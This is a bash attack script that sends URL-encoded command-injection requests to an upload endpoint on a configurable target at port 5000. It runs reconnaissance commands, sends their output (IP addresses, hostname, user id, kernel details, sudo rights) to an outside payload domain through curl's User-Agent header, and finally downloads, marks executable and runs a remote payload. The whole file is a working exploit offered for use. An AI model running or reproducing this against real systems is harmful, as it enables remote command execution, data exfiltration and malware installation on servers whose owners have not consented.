#!/bin/bash

echo "Loading configs/$1"
source configs/$1


echo "exploit attempts"
curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20ls%20%23"
sleep 2s
curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20whoami%20%23"
sleep 3s
curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20id%20%23"
sleep 4s
curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20touch%20exp%20%23"
sleep 4s

echo "recon server"
curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%24%28hostname -I%29%20$PAYLOAD_DOMAIN%20%23"
sleep 2s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%24%28hostname%29%20$PAYLOAD_DOMAIN%20%23"
sleep 4s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%24%28whoami%29%20$PAYLOAD_DOMAIN%20%23"
sleep 7s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%24%28id%29%20$PAYLOAD_DOMAIN%20%23"
sleep 2s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%22%24%28id%29%22%20$PAYLOAD_DOMAIN%20%23"
sleep 8s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%22%24%28ls -m%29%22%20$PAYLOAD_DOMAIN%20%23"
sleep 2s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%22%24%28dmesg%29%22%20$PAYLOAD_DOMAIN%20%23"
sleep 3s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%22%24%28uname -a%29%22%20$PAYLOAD_DOMAIN%20%23"
sleep 5s

curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20curl%20-A%20%22%24%28sudo -l%29%22%20$PAYLOAD_DOMAIN%20%23"
sleep 11s


echo "Downloading and execute exploit"
curl -k "$TARGET_DOMAIN:5000/upload/none%3B%20wget%20$PAYLOAD_DOMAIN%3B%20chmod%20%2Bx%20index.html%3B%20bash%20index.html%20%23"

echo "done."


